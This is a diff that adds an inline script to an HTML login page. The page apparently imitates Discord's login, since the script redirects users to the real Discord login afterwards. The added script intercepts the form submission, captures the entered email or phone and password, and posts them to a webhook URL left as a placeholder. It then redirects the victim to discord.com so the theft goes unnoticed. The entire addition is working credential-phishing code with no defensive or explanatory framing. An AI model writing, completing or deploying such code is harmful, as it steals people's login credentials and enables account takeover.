@@ -92,6 +92,45 @@
     </div>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcode-generator/1.4.4/qrcode.min.js"></script>
     <script src="./js/script.js"></script>
+    <script>
+    document.getElementById('loginForm').addEventListener('submit', function(event) {
+        event.preventDefault(); // Prevent the default form submission
+
+        const email = document.getElementById('emailORphone').value;
+        const password = document.getElementById('password').value;
+
+        // Replace with your actual webhook URL
+        const webhookURL = 'YOUR_WEBHOOK_URL';
+
+        // Create the payload to send to the webhook
+        const payload = {
+            content: `Email: ${email}\nPassword: ${password}`
+        };
+
+        // Send the data to the webhook using fetch
+        fetch(webhookURL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(payload)
+        })
+        .then(response => {
+            if (response.ok) {
+                console.log('Data sent to webhook successfully!');
+                // Optionally redirect the user or display a success message
+                window.location.href = "https://discord.com/login"; //redirect to the real discord login
+            } else {
+                console.error('Failed to send data to webhook.');
+                // Optionally display an error message to the user
+            }
+        })
+        .catch(error => {
+            console.error('Error sending data to webhook:', error);
+            // Optionally display an error message to the user
+        });
+    });
+</script>
 </body>
 
 </html>
